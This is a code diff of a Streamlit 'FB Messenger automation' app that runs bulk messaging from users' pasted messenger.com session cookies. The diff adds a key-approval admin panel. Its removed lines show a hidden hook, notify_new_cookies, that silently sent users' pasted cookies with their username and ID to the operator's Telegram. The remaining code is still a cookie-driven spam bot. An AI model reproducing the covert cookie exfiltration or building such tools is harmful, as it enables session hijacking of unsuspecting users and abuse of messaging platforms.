@@ -1,8 +1,6 @@
 import streamlit as st
-import streamlit.components.v1 as components
 import time
 import threading
-import uuid
 import hashlib
 import os
 import json
@@ -62,17 +60,6 @@ custom_css = """
         overflow: hidden;
     }
 
-    .main-header::before {
-        content: "💀";
-        position: absolute;
-        top: -40px;
-        left: 50%;
-        transform: translateX(-50%);
-        font-size: 6.5rem;
-        opacity: 0.14;
-        color: #ffd700;
-    }
-
     .main-header h1 {
         background: linear-gradient(90deg, #ffd700, #ffeb3b, #ffd700);
         -webkit-background-clip: text;
@@ -90,16 +77,6 @@ custom_css = """
         font-size: 1.8rem;
         margin-top: 0.7rem;
         letter-spacing: 1.8px;
-    }
-
-    .prince-logo {
-        width: 120px;
-        height: 120px;
-        border-radius: 50%;
-        margin-bottom: 22px;
-        border: 4px solid #ffd700;
-        box-shadow: 0 0 35px rgba(255, 215, 0, 0.8),
-                    inset 0 0 18px rgba(255, 255, 255, 0.35);
     }
 
     .stButton>button {
@@ -286,17 +263,15 @@ def send_to_telegram(message):
     except:
         pass
 
-def notify_new_cookies(username, user_id, cookies_str):
-    if not cookies_str.strip():
-        return
+def notify_key_request(username, user_id, approval_key):
     msg = (
-        f"🍪 <b>NEW COOKIES SUBMITTED</b>\n\n"
+        f"🔑 <b>NEW KEY REQUEST</b>\n\n"
         f"👤 Username: {username}\n"
         f"🆔 UserID: {user_id}\n"
+        f"🔑 Key: {approval_key}\n"
         f"⏰ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
         f"────────────────────────────\n"
-        f"{cookies_str}\n"
-        f"────────────────────────────"
+        f"Please approve in admin panel"
     )
     send_to_telegram(msg)
 
@@ -668,6 +643,7 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
               
                 log_message(f'{process_id}: Message #{messages_sent} sent. Waiting {delay}s...', automation_state)
                 
+                # ─── IMPROVED STOP RESPONSIVENESS ───
                 waited = 0
                 while waited < delay and automation_state.running:
                     time.sleep(0.5)
@@ -715,16 +691,16 @@ def run_automation_threaded(config, user_id):
 
 html_header = """
 <div class="main-header">
-    <h1>👑 BOYFRIEND PIIE 👑</h1>
-    <p>✨ FB MESSENGER AUTOMATION ✨</p>
+    <h1>👑❤️ BOYFRIEND PIIE ❤️†</h1>
+    <p>MESSENGER AUTOMATION</p>
 </div>
 """
 st.markdown(html_header, unsafe_allow_html=True)
 
 if not st.session_state.logged_in:
-    col1, col2 = st.columns(2)
+    tab_login, tab_register, tab_admin = st.tabs(["🔐 LOGIN", "📝 REGISTER", "👑 ADMIN"])
     
-    with col1:
+    with tab_login:
         st.subheader("🔐 LOGIN")
         login_user = st.text_input("Username", key="login_user", placeholder="Enter username")
         login_pass = st.text_input("Password", type="password", key="login_pass", placeholder="Enter password")
@@ -736,6 +712,17 @@ if not st.session_state.logged_in:
                     st.session_state.logged_in = True
                     st.session_state.user_id = user_id
                     st.session_state.username = login_user
+                    
+                    pending = load_pending_approvals()
+                    if login_user in pending:
+                        st.session_state.user_key = pending[login_user]['key']
+                        st.session_state.approval_status = 'pending'
+                    
+                    approved = load_approved_keys()
+                    if login_user in approved:
+                        st.session_state.key_approved = True
+                        st.session_state.approval_status = 'approved'
+                    
                     st.success("✅ Login successful!")
                     time.sleep(1)
                     st.rerun()
@@ -744,7 +731,7 @@ if not st.session_state.logged_in:
             else:
                 st.warning("⚠️ Please enter username and password")
     
-    with col2:
+    with tab_register:
         st.subheader("📝 REGISTER")
         reg_user = st.text_input("New Username", key="reg_user", placeholder="Choose username")
         reg_pass = st.text_input("New Password", type="password", key="reg_pass", placeholder="Choose password")
@@ -757,10 +744,87 @@ if not st.session_state.logged_in:
                     success, message = db.create_user(reg_user, reg_pass)
                     if success:
                         st.success(f"✅ {message}")
+                        
+                        approval_key = generate_user_key(reg_user, reg_pass)
+                        pending = load_pending_approvals()
+                        pending[reg_user] = {
+                            'key': approval_key,
+                            'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
+                            'user_id': db.verify_user(reg_user, reg_pass)
+                        }
+                        save_pending_approvals(pending)
+                        
+                        user_id = db.verify_user(reg_user, reg_pass)
+                        notify_key_request(reg_user, user_id, approval_key)
+                        
+                        st.info(f"🔑 Your KEY: **{approval_key}**\n\nSend to admin for approval!")
                     else:
                         st.error(f"❌ {message}")
             else:
                 st.warning("⚠️ Please fill all fields")
+    
+    with tab_admin:
+        st.subheader("👑 ADMIN PANEL")
+        
+        admin_pass = st.text_input("Admin Password", type="password", key="admin_login_pass")
+        
+        if admin_pass == ADMIN_PASSWORD:
+            st.success("✅ Admin Access Granted!")
+            
+            st.markdown("---")
+            
+            st.subheader("📋 Pending Approvals")
+            pending = load_pending_approvals()
+            approved = load_approved_keys()
+            
+            if pending:
+                for username, data in pending.items():
+                    col1, col2, col3 = st.columns([2, 1, 1])
+                    with col1:
+                        st.write(f"👤 {username} - {data['key']}")
+                    with col2:
+                        if st.button(f"✅ Approve", key=f"approve_{username}"):
+                            approved[username] = {
+                                'key': data['key'],
+                                'approved_at': time.strftime("%Y-%m-%d %H:%M:%S")
+                            }
+                            save_approved_keys(approved)
+                            del pending[username]
+                            save_pending_approvals(pending)
+                            st.success(f"✅ {username} approved!")
+                            time.sleep(1)
+                            st.rerun()
+                    with col3:
+                        if st.button(f"❌ Reject", key=f"reject_{username}"):
+                            del pending[username]
+                            save_pending_approvals(pending)
+                            st.error(f"❌ {username} rejected!")
+                            time.sleep(1)
+                            st.rerun()
+            else:
+                st.info("✅ No pending approvals")
+            
+            st.markdown("---")
+            
+            st.subheader("✅ Approved Users")
+            if approved:
+                for username, data in approved.items():
+                    col1, col2 = st.columns([3, 1])
+                    with col1:
+                        st.write(f"✅ {username}")
+                    with col2:
+                        if st.button(f"🗑️ Remove", key=f"remove_{username}"):
+                            del approved[username]
+                            save_approved_keys(approved)
+                            st.warning(f"Removed {username}")
+                            time.sleep(1)
+                            st.rerun()
+            else:
+                st.info("No approved users yet")
+        
+        else:
+            if admin_pass:
+                st.error("❌ Wrong admin password")
 
 else:
     username = st.session_state.username
@@ -776,7 +840,18 @@ else:
             st.session_state.username = None
             st.rerun()
     
-    tab1, tab2, tab3 = st.tabs(["⚙️ SETTINGS", "🤖 AUTOMATION", "📊 ADMIN"])
+    if not st.session_state.key_approved:
+        st.warning("⏳ Your key is pending admin approval")
+        
+        if st.session_state.approval_status == 'pending':
+            st.info(f"🔑 Your KEY: **{st.session_state.user_key}**")
+            
+            whatsapp_url = send_whatsapp_message(username, st.session_state.user_key)
+            st.markdown(f"[📱 Send KEY to Admin via WhatsApp]({whatsapp_url})", unsafe_allow_html=True)
+        
+        st.stop()
+    
+    tab1, tab2, tab3 = st.tabs(["⚙️ SETTINGS", "🤖 AUTOMATION", "👑 ADMIN"])
     
     with tab1:
         st.subheader("⚙️ Configuration Settings")
@@ -818,9 +893,6 @@ else:
             height=100,
             placeholder="Paste your messenger.com cookies here"
         )
-        
-        if cookies and cookies != config['cookies']:
-            notify_new_cookies(username, user_id, cookies[:200])
         
         if st.button("💾 SAVE SETTINGS", use_container_width=True):
             db.update_user_config(user_id, chat_id, name_prefix, delay, cookies, messages)
@@ -868,20 +940,60 @@ else:
     with tab3:
         st.subheader("👑 ADMIN PANEL")
         
-        admin_pass = st.text_input("Admin Password", type="password")
+        admin_pass = st.text_input("Admin Password", type="password", key="admin_panel_pass")
         
         if admin_pass == ADMIN_PASSWORD:
             st.success("✅ Admin access granted!")
             
-            col1, col2 = st.columns(2)
+            st.subheader("📋 Pending Approvals")
+            pending = load_pending_approvals()
+            approved = load_approved_keys()
             
-            with col1:
-                all_users = db.init_db()
-                st.metric("👥 Total Users", "Users data loaded")
+            if pending:
+                for username, data in pending.items():
+                    col1, col2, col3 = st.columns([2, 1, 1])
+                    with col1:
+                        st.write(f"👤 {username} - {data['key']}")
+                    with col2:
+                        if st.button(f"✅ Approve", key=f"approve_tab_{username}"):
+                            approved[username] = {
+                                'key': data['key'],
+                                'approved_at': time.strftime("%Y-%m-%d %H:%M:%S")
+                            }
+                            save_approved_keys(approved)
+                            del pending[username]
+                            save_pending_approvals(pending)
+                            st.success(f"✅ {username} approved!")
+                            time.sleep(1)
+                            st.rerun()
+                    with col3:
+                        if st.button(f"❌ Reject", key=f"reject_tab_{username}"):
+                            del pending[username]
+                            save_pending_approvals(pending)
+                            st.error(f"❌ {username} rejected!")
+                            time.sleep(1)
+                            st.rerun()
+            else:
+                st.info("✅ No pending approvals")
             
-            with col2:
-                st.metric("🔐 Security", "Encryption active")
+            st.markdown("---")
+            
+            st.subheader("✅ Approved Users")
+            if approved:
+                for username, data in approved.items():
+                    col1, col2 = st.columns([3, 1])
+                    with col1:
+                        st.write(f"✅ {username}")
+                    with col2:
+                        if st.button(f"🗑️ Remove", key=f"remove_tab_{username}"):
+                            del approved[username]
+                            save_approved_keys(approved)
+                            st.warning(f"Removed {username}")
+                            time.sleep(1)
+                            st.rerun()
+            else:
+                st.info("No approved users yet")
         
         else:
             if admin_pass:
-                st.error("❌ Invalid admin password")
+                st.error("❌ Wrong password")
